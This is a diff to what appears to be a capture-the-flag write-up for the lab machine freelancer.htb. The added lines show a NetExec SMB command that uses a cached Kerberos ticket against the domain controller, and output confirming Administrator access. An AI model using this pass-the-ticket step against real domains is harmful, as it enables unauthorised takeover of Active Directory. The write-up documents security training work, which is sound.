@@ -740,6 +740,14 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Then after syncing to the DC, i can get an administrator TGT
 
 ```python
+faketime -f +5h nxc smb dc.freelancer.htb --use-kcache
+SMB         dc.freelancer.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc.freelancer.htb 445    DC               [+] FREELANCER\Administrator from ccache (Pwn3d!)
+```
+
+Now as seen here i can auth as the DA
+
+```python
 
 ```
 
